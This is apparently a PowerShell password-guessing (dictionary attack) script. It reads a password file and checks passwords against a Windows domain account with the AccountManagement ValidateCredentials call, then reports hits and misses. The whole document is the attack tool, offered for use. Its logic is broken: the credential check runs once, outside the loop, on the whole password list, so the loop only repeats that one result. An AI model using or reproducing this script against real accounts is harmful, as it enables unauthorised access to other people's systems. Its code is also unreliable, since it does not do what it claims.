# exploit-dictionary-attack

$userlist = "maldori"
$passlist = Get-Content "c:\temp\pass.txt"
$ComputerName = "maldori-PC"

Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)

$result = $principalContext.ValidateCredentials($userlist, $passlist)

foreach ($username in $userlist) {
    foreach($pass in $passlist) {
        Write-Verbose "check [$username : $pass]"
        if ($result -eq $true) {
            Write-Output "Found Pass! $username : $pass"
            break
        }
        else  {
            Write-Output "Wrong! $username : $pass"
        }
        
    }

}
